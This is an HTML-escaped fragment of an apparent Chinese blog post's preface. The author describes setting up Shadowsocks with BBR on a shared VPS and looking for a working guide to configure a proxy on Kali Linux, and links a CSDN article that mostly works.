-      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;a href=&quot;#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了&lt;a href=&quot;https://blog.csdn.net/qq_27766969/article/details/71593611&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！&lt;/h4&gt;
     
     </summary>
     
